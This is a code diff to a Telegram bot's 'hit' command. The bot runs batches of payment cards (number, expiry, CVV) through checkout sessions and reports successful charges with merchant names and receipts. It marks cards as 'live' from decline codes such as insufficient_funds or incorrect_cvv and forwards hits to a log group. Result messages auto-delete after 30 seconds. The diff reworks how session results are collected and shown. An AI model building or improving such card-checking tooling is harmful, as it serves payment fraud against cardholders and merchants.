@@ -196,6 +196,7 @@ async def hit_command(message: types.Message):
         status_msg = await message.answer(f"🎯 <b>Target Locked. Hitting...</b>")
     
     anim_task = None
+    session_results = []
     
     # Callback to update the Telegram message
     async def update_status(data):
@@ -253,34 +254,37 @@ async def hit_command(message: types.Message):
             if anim_task:
                 anim_task.cancel()
                 
-            # For single card, delete the temporary status message to keep chat clean
-            if len(cards) == 1 and status_msg:
-                try: await status_msg.delete()
-                except: pass
-                
-            # Send an individual message for the hit result
             card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
             amt = res.get('amount')
             if isinstance(amt, int) or (isinstance(amt, str) and amt.isdigit()):
-                amt_str = f"\n💰 <b>Amount:</b> ${int(amt)/100:.2f}"
+                amt_str_formatted = f" (${int(amt)/100:.2f})"
+                amt_str_msg = f"\n💰 <b>Amount:</b> ${int(amt)/100:.2f}"
             elif amt:
-                amt_str = f"\n💰 <b>Amount:</b> {amt}"
+                amt_str_formatted = f" ({amt})"
+                amt_str_msg = f"\n💰 <b>Amount:</b> {amt}"
             else:
-                amt_str = ""
-            
+                amt_str_formatted = ""
+                amt_str_msg = ""
+                
+            # Log forwarding and entry creation
             if res['success']:
                 final_url = res.get('final_url')
                 receipt_url = res.get('receipt_url')
                 
-                url_str = ""
+                url_str_formatted = ""
+                url_str_msg = ""
                 if final_url:
                     import html
-                    final_url = html.escape(final_url)
-                    url_str += f"\n🔗 <b>Confirmation:</b> {final_url}"
+                    escaped_final = html.escape(final_url)
+                    url_str_formatted += f" <a href='{escaped_final}'>[🔗 Conf]</a>"
+                    url_str_msg += f"\n🔗 <b>Confirmation:</b> {escaped_final}"
                 if receipt_url:
                     import html
-                    receipt_url = html.escape(receipt_url)
-                    url_str += f"\n🧾 <b>Receipt:</b> {receipt_url}"
+                    escaped_receipt = html.escape(receipt_url)
+                    url_str_formatted += f" <a href='{escaped_receipt}'>[🧾 Receipt]</a>"
+                    url_str_msg += f"\n🧾 <b>Receipt:</b> {escaped_receipt}"
+                    
+                log_entry = f"✅ <code>{card_str}</code>{amt_str_formatted} -> <b>SUCCESS</b>{url_str_formatted} ({res['response_time']:.2f}s)"
                 
                 merchant_name = res.get('merchant') or 'Unknown'
                 if isinstance(merchant_name, str):
@@ -288,13 +292,13 @@ async def hit_command(message: types.Message):
                     merchant_name = html.escape(merchant_name)
                 merchant_str = f"\n🛒 <b>Merchant:</b> {merchant_name}" if merchant_name != 'Unknown' else ""
                 
-                hit_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}{merchant_str}{url_str}\n⏱ {res['response_time']:.2f}s"
+                hit_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str_msg}{merchant_str}{url_str_msg}\n⏱ {res['response_time']:.2f}s"
+                
                 if LOG_GROUP_ID:
                     try:
-                        log_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}{merchant_str}{url_str}\n👤 <b>User:</b> {message.from_user.first_name}\n⏱ {res['response_time']:.2f}s"
+                        log_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str_msg}{merchant_str}{url_str_msg}\n👤 <b>User:</b> {message.from_user.first_name}\n⏱ {res['response_time']:.2f}s"
                         await bot.send_message(LOG_GROUP_ID, log_text)
-                    except:
-                        pass
+                    except: pass
             else:
                 code = res.get('decline_code') or res.get('error') or 'unknown'
                 if isinstance(code, str):
@@ -302,9 +306,11 @@ async def hit_command(message: types.Message):
                     code_escaped = html.escape(code)
                 else:
                     code_escaped = str(code)
+                    
+                log_entry = f"❌ <code>{card_str}</code>{amt_str_formatted} -> <code>{code_escaped.lower()}</code> ({res['response_time']:.2f}s)"
                 
                 # Live Card Detection
-                hit_text = f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}\n"
+                hit_text = f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str_msg}\n"
                 
                 merchant_name = res.get('merchant') or 'Unknown'
                 if isinstance(merchant_name, str):
@@ -324,31 +330,38 @@ async def hit_command(message: types.Message):
                         err_str = "Session is locked, expired, already paid, or merchant has strictly bound it to a logged-in session."
                     err_str = html.escape(err_str)
                     hit_text += f"\n🐛 <code>{err_str}</code>..."
+                    
                 live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded']
                 if any(c in code.lower() for c in live_codes):
                     hit_text += "\n⚠️ <b>Card is live</b>"
-                
+                    
                 if LOG_GROUP_ID and any(c in code.lower() for c in live_codes):
                     try:
                         log_text = hit_text + f"\n👤 <b>User:</b> {message.from_user.first_name}"
                         await bot.send_message(LOG_GROUP_ID, log_text)
-                    except:
-                        pass
-                        
-            hit_text += "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
-            try:
-                sent_msg = await message.answer(hit_text)
-            except Exception as e:
-                # Fallback to plain text if HTML crashes
-                import re
-                plain_text = re.sub(r'<[^>]+>', '', hit_text)
-                sent_msg = await message.answer(f"⚠️ UI Formatting Error: {e}\n\nRAW RESULT:\n{plain_text}")
+                    except: pass
+                    
+            session_results.append(log_entry)
             
-            async def auto_delete(m):
-                await asyncio.sleep(30)
-                try: await m.delete()
-                except: pass
-            asyncio.create_task(auto_delete(sent_msg))
+            # Send separate message only if len(cards) == 1
+            if len(cards) == 1:
+                if status_msg:
+                    try: await status_msg.delete()
+                    except: pass
+                    
+                hit_text += "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+                try:
+                    sent_msg = await message.answer(hit_text)
+                except Exception as e:
+                    import re
+                    plain_text = re.sub(r'<[^>]+>', '', hit_text)
+                    sent_msg = await message.answer(f"⚠️ UI Formatting Error: {e}\n\nRAW RESULT:\n{plain_text}")
+                    
+                async def auto_delete(m):
+                    await asyncio.sleep(30)
+                    try: await m.delete()
+                    except: pass
+                asyncio.create_task(auto_delete(sent_msg))
             
             # Update the main progress message
             if len(cards) > 1:
@@ -360,11 +373,13 @@ async def hit_command(message: types.Message):
                 filled = int(bar_len * comp / total)
                 bar = "█" * filled + "░" * (bar_len - filled)
                 
+                results_str = "\n".join(session_results)
                 prog_text = (
                     f"🎯 <b>Hitting Session Running</b>\n\n"
                     f"📊 <code>[{bar}]</code> {pct}%\n"
                     f"⏳ <b>Progress:</b> {comp}/{total}\n"
-                    f"✅ {data['successes']}  |  ❌ {data['fails']}"
+                    f"✅ {data['successes']}  |  ❌ {data['fails']}\n\n"
+                    f"{results_str}"
                 )
                 try:
                     await status_msg.edit_text(prog_text)
@@ -378,15 +393,20 @@ async def hit_command(message: types.Message):
                 except: pass
             
             if len(cards) > 1:
+                results_str = "\n".join(session_results)
                 text = (
                     f"🎯 <b>Hitting Session Completed!</b>\n\n"
                     f"✅ <b>Live:</b> {data['successes']}\n"
                     f"❌ <b>Dead:</b> {data['fails']}\n\n"
+                    f"{results_str}"
                 )
                 if status_msg:
-                    try: await status_msg.delete()
-                    except: pass
-                await message.answer(text)
+                    try: await status_msg.edit_text(text)
+                    except:
+                        try: await message.answer(text)
+                        except: pass
+                else:
+                    await message.answer(text)
             if user_id in active_sessions:
                 del active_sessions[user_id]
         
@@ -400,9 +420,15 @@ async def hit_command(message: types.Message):
             import html
             error_msg = html.escape(error_msg)
             
+            if len(cards) > 1 and session_results:
+                results_str = "\n".join(session_results)
+                results_part = f"\n\n<b>Partial results:</b>\n{results_str}"
+            else:
+                results_part = ""
+                
             try: await status_msg.delete()
             except: pass
-            await message.answer(f"❌ <b>Error processing session:</b>\n<code>{error_msg}</code>")
+            await message.answer(f"❌ <b>Error processing session:</b>\n<code>{error_msg}</code>{results_part}")
             if user_id in active_sessions:
                 del active_sessions[user_id]
 
